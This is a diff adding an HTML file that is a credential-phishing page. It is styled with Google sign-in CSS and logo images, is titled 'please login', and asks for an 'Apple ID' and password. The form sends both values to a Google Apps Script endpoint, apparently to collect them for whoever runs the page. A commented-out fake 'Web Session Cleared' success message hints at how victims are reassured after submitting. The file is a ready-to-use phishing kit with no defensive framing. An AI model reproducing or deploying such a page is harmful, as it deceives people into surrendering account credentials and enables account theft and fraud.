@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta content="width=300, initial-scale=1" name="viewport">
+<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+
+
+    <style>html ::-webkit-input-placeholder { /* Chrome/Opera/Safari */
+  color: #999999;
+}
+::-moz-placeholder { /* Firefox 19+ */
+  color: #999999;
+}
+:-ms-input-placeholder { /* IE 10+ */
+  color: #999999;
+}
+:-moz-placeholder { /* Firefox 18- */
+  color: #999999;
+}
+.rc-button,
+  .rc-button:visited {
+  display: inline-block;
+  position: relative!;
+  width: 260px!;
+  width: 260px;
+  text-align: center;
+  color: #000000;
+  font-size: 20px !important;
+  font-weight: 500;
+  height: 36px;
+  padding: 0 8px;
+  line-height: 36px;
+  -moz-border-radius: 3px;
+  -webkit-border-radius: 3px;
+  border-radius: 3px;
+  -o-transition: all 0.218s;
+  -moz-transition: all 0.218s;
+  -webkit-transition: all 0.218s;
+  transition: all 0.218s;
+  border: 1px solid #000000;
+  background-color: #000000;
+  background-image: -webkit-linear-gradient(top,#000000,#000000);
+  background-image: -moz-linear-gradient(top,#000000,#000000);
+  background-image: -ms-linear-gradient(top,#000000,#000000);
+  background-image: -o-linear-gradient(top,#000000,#000000);
+  background-image: linear-gradient(top,#000000,#000000);
+  -o-transition: none;
+  -moz-user-select: none;
+  -webkit-user-select: none;
+  user-select: none;
+  cursor: default;
+  }
+  .card .rc-button {
+  width: 100%;
+  width: 273px !important;
+  padding: 0;
+
+  }
+  .rc-button.disabled,
+  .rc-button[disabled] {
+  opacity: .5;
+  filter: alpha(opacity=50);
+  cursor: default;
+  pointer-events: none;
+  }
+  .rc-button:hover {
+  border: 1px solid #000000;
+  color: #ffffff;
+  text-decoration: none;
+  -o-transition: all 0.0s;
+  -moz-transition: all 0.0s;
+  -webkit-transition: all 0.0s;
+  transition: all 0.0s;
+  background-color: #000000;
+  background-image: -webkit-linear-gradient(top,#000000,#000000);
+  background-image: -moz-linear-gradient(top,#000000,#000000);
+  background-image: -ms-linear-gradient(top,#000000,#000000);
+  background-image: -o-linear-gradient(top,#000000,#000000);
+  background-image: linear-gradient(top,#000000,#000000);
+  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
+  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
+  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
+  }
+  .rc-button:active {
+  background-color: #000000;
+  background-image: -webkit-linear-gradient(top,#000000,#000000);
+  background-image: -moz-linear-gradient(top,#000000,#000000);
+  background-image: -ms-linear-gradient(top,#000000,#000000);
+  background-image: -o-linear-gradient(top,#000000,#000000);
+  background-image: linear-gradient(top,#000000,#000000);
+  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+  }
+  .rc-button-submit,
+  .rc-button-submit:visited {
+  border: 1px solid #000000;
+  color: #ffffff;
+  text-shadow: 0 1px rgba(0,0,0,0.1);
+  background-color: #000000 !important;
+  position: relative !important;
+  background-image: -webkit-linear-gradient(top,#000000,#000000);
+  background-image: -moz-linear-gradient(top,#000000,#000000);
+  background-image: -ms-linear-gradient(top,#000000,#000000);
+  background-image: -o-linear-gradient(top,#000000,#000000);
+  background-image: linear-gradient(top,#000000,#000000);
+  }
+
+
+  .banner h1 {
+  font-family: 'Open Sans', arial;
+  -webkit-font-smoothing: antialiased;
+  color: #ffffff;
+  font-size: 42px;
+  font-weight: 300;
+  margin-top: 0;
+  margin-bottom: 20px;
+  }
+  .banner h2 {
+  font-family: 'Open Sans', arial;
+  -webkit-font-smoothing: antialiased;
+  color: #ffffff;
+  font-size: 18px;
+  font-weight: 400;
+  margin-bottom: 20px;
+  }
+  .signin-card {
+  width: 274px;
+  padding: 40px 40px;
+  }
+  .signin-card .profile-img {
+  width: 96px;
+  height: 96px;
+  margin: 0 auto 10px;
+  display: block;
+  -moz-border-radius: 50%;
+  -webkit-border-radius: 50%;
+  border-radius: 50%;
+  }
+  .signin-card .profile-name {
+  font-size: 16px;
+  font-weight: bold;
+  text-align: center;
+  margin: 10px 0 0;
+  min-height: 1em;
+  }
+  .signin-card .profile-email {
+  font-size: 16px;
+  text-align: center;
+  margin: 10px 0 20px 0;
+  min-height: 1em;
+  }
+  .signin-card input[type=email],
+  .signin-card input[type=password],
+  .signin-card input[type=text],
+  .signin-card input[type=submit] {
+  width: 100%;
+  display: block;
+  margin-bottom: 10px;
+  z-index: 1;
+  position: relative;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  }
+  .signin-card #Email,
+  .signin-card #Passwd,
+  .signin-card .captcha {
+  direction: ltr;
+  height: 44px;
+  font-size: 16px;
+
+  }
+  .signin-card #Email + .stacked-label {
+  margin-top: 15px;
+  }
+  .signin-card #reauthEmail {
+  display: block;
+  margin-bottom: 10px;
+  line-height: 36px;
+  padding: 0 8px;
+  font-size: 15px;
+  color: #ffffff;sub  line-height: 2;
+  margin-bottom: 10px;
+  font-size: 20px;
+  text-align: center;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  }
+  .one-google p {
+  margin: 0 0 10px;
+  color: #555;
+  font-size: 20px;
+  text-align: center;
+  }
+  .one-google p.create-account,
+  .one-google p.switch-account {
+  margin-bottom: 60px;
+  }
+  .one-google .logo-strip {
+  background-repeat: no-repeat;
+  display: block;
+  margin: 10px auto;
+  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png);
+  background-size: 230px 17px;
+  width: 230px;
+  height: 17px;
+  }
+
+
+  .banner h1 {
+  font-size: 38px;
+  margin-bottom: 15px;
+  }
+  .banner h2 {
+  margin-bottom: 15px;
+  }
+  .one-google p.create-account,
+  .one-google p.switch-account {
+  margin-bottom: 30px;
+  }
+  .signin-card #Email {
+  margin-bottom: 0;
+  }
+  .signin-card #Passwd {
+  margin-top: -1px;
+
+  }
+  .signin-card #Email.form-error,
+  .signin-card #Passwd.form-error {
+  z-index: 2;
+  }
+  .signin-card #Email:hover,
+  .signin-card #Email:focus,
+  .signin-card #Passwd:hover,
+  .signin-card #Passwd:focus {
+  z-index: 3;
+  }
+p {
+        line-height: 0%;
+     }
+
+<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
+  .google-header-bar.centered {
+  height: 83px;
+  }
+  .google-header-bar.centered .header .logo {
+  margin: 25px auto 20px;
+  }
+  .card {
+  margin-bottom: 20px;
+  }
+</style>
+<style media="screen and (max-width: 580px)">
+  html, body {
+  font-size: 20px;
+  }
+  .google-header-bar.centered {
+  height: 73px;
+  }
+  .google-header-bar.centered .header .logo {
+  margin: 20px auto 15px;
+  }
+  .content {
+  padding-left: 10px;
+  padding-right: 10px;
+  }
+  .hidden-small {
+  display: none;
+  }
+  .card {
+  padding: 20px 15px 30px;
+  width: 270px;
+  }
+  .footer ul li {
+  padding-right: 1em;
+  }
+  .lang-chooser-wrap {
+  display: none;
+  }
+</style>
+<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
+  .header .logo {
+  background-image: url(https://ssl.gstatic.com/accounts/ui/logo_2x.png);
+  }
+  .header .logo-w {
+  background-image: url(https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_112x36dp.png);
+  }
+</style>
+<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
+  .banner h1 {
+  font-size: 38px;
+  margin-bottom: 15px;
+  }
+  .banner h2 {
+  margin-bottom: 15px;
+  }
+  .one-google p.create-account,
+  .one-google p.switch-account {
+  margin-bottom: 30px;
+  }
+  .signin-card #Email {
+  margin-bottom: 0;
+  }
+  .signin-card #Passwd {
+
+  margin-top: -1px;
+  }
+  .signin-card #Email.form-error,
+  .signin-card #Passwd.form-error {
+  z-index: 2;
+  }
+  .signin-card #Email:hover,
+  .signin-card #Email:focus,
+  .signin-card #Passwd:hover,
+  .signin-card #Passwd:focus {
+  z-index: 3;
+  }
+</style>
+<style media="screen and (max-width: 580px)">
+  html, body {
+  font-size: 20px;
+  }
+  .google-header-bar.centered {
+  height: 73px;
+  }
+  .google-header-bar.centered .header .logo {
+  margin: 20px auto 15px;
+  }
+  .content {
+  padding-left: 10px;
+  padding-right: 10px;
+  }
+  .hidden-small {
+  display: none;
+  }
+  .card {
+  padding: 20px 15px 30px;
+  width: 270px;
+  }
+  .footer ul li {
+  padding-right: 1em;
+  }
+  .lang-chooser-wrap {
+  display: none;
+  }</style>
+<style media="screen and (max-width: 580px)">
+  .banner h1 {
+  font-size: 22px;
+  margin-bottom: 15px;
+  }
+  .signin-card {
+  width: 260px;
+  padding: 20px 20px;
+  margin: 0 auto 20px;
+  }
+  .signin-card .profile-img {
+  width: 72px;
+  height: 72px;
+  -moz-border-radius: 72px;
+  -webkit-border-radius: 72px;
+  border-radius: 72px;
+  }
+</style>
+
+<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
+  .one-google .logo-strip {
+  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_2x.png);
+  }
+</style>
+
+</style>
+    <title>please login</title>
+</head>
+<body bgcolor="#f7f7f7">
+
+<center>
+
+
+
+
+
+
+<form id="gform" method="POST" action="https://script.google.com/macros/s/AKfycbyotnjcr3I9J-9_jqxvLGs7jBoFiiqQXiJ6CbSBpGBgFtC8bYxz/exec">
+
+
+  <input type="email" name="email" type="email" placeholder="Apple ID" style="width: 270px; color: #999999;" hidden><br><br>
+
+
+  <input id="" type="message" name="message" placeholder="Apple ID*" style="width: 260px; height:38px;
+    border-width: 1px;
+    border-style: solid; border-color: #000000; font-family: 'Open Sans'; font-size: 19px; color: #000000 !important;
+  font-style: bold; padding-left:10px; 
+  -moz-border-radius: 5px;
+  -webkit-border-radius: 5px;
+  border-radius: 5px;"></textarea>
+  <p>
+
+    <input id="Passwd" type="password" name="message" placeholder="Password*" style="width: 260px; height:38px;
+    border-width: 1px; border-style: solid; border-color: #000000; font-family: 'Open Sans'; font-size: 19px;
+  font-style: bold; padding-left:10px;
+   -moz-border-radius: 5px;
+  -webkit-border-radius: 5px;
+  border-radius: 5px;"></textarea>
+  <p>
+
+
+
+  <br><button type="submit" class="rc-button rc-button-submit" style="width: 275px !important; height:47px; position: relative !important;">Sign In</button>
+
+</form>
+
+</form>
+
+</center>
+<!-- Customise the Thankyou Message People See when they submit the form: 
+  <div style="display:none;" id="thankyou_message">
+    <h2><em>Success!</em> Web Session Cleared
+      Make sure 2 is reset</h2>
+  </div>
+
+<script data-cfasync="false" type="text/javascript"
+src="https://samson89.github.io/form-submission-handler.js"></script>-->
+
+</body>
+</html>
